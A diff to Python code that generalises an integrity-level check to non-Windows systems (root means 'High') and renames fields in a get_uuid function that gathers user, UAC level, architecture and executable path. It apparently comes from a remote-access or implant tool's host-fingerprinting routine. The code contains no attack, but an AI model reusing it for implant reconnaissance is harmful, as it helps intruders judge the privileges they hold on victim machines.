@@ -13,11 +13,14 @@ if sys.platform == 'win32':
     from _winreg import *
     import ctypes
 
-def get_integrity_level_win():
+def get_integrity_level():
     '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''
 
     if sys.platform != 'win32':
-        return "N/A"
+        if os.geteuid() != 0:
+            return "Medium"
+        else:
+            return "High"
 
     mapping = {
         0x0000: u'Untrusted',
@@ -185,7 +188,7 @@ def get_uuid():
     proc_arch=None
     proc_path=sys.executable
     uacLevel = None
-    integrity_level_win = None
+    integrity_level = None
     try:
         if sys.platform=="win32":
             user=GetUserName().decode(encoding=os_encoding).encode("utf8")
@@ -253,9 +256,9 @@ def get_uuid():
         uacLevel = "?"
 
     try:
-        integrity_level_win = get_integrity_level_win()
+        integrity_level = get_integrity_level()
     except Exception as e:
-        integrity_level_win = "?"
+        integrity_level = "?"
 
     return {
         'user': user,
@@ -269,5 +272,5 @@ def get_uuid():
         'proc_arch': proc_arch,
         'exec_path': proc_path,
         'uac_lvl': uacLevel,
-        'intgty_lvl': integrity_level_win
+        'intgty_lvl': integrity_level
     }
